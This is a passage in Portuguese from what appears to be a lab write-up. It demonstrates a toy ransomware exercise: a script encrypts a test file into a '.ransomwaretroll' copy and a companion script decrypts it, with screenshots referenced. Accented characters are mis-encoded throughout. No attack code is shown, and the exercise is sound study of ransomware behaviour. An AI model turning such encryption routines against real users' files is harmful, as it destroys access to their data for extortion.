Com o comando `python3 -m pip list` eram listadas todas as bibliotecas instaladas naquele ambiente virtual. Apesar de a biblioteca **os** n√£o aparecer nessa lista, ela faz parte da biblioteca padr√£o do **Python** e est√° sempre dispon√≠vel dentro do **virtualenv**, pois o ambiente virtual reutiliza a biblioteca padr√£o da instala√ß√£o do **Python** do sistema.

Ap√≥s essa etapa, executou-se o script de criptografia com `python encrypter.py`. O conte√∫do do arquivo criptografado foi verificado com `ls` e `cat teste.txt.ransomwaretroll`, conforme imagem 29. Para restaurar o arquivo original, executou-se `python decrypter.py` e, em seguida, conferiu-se o resultado com `ls` e `cat teste.txt`, como mostrado na imagem 30.

<div align="Center"><figure>
    <img src="../0-aux/md4-img29.png" alt="img29"><br>
    <figcaption>Imagem 29.</figcaption>
</figure></div><br>

<div align="Center"><figure>
    <img src="../0-aux/md4-img30.png" alt="img30"><br>
    <figcaption>Imagem 30.</figcaption>
</figure></div><br>





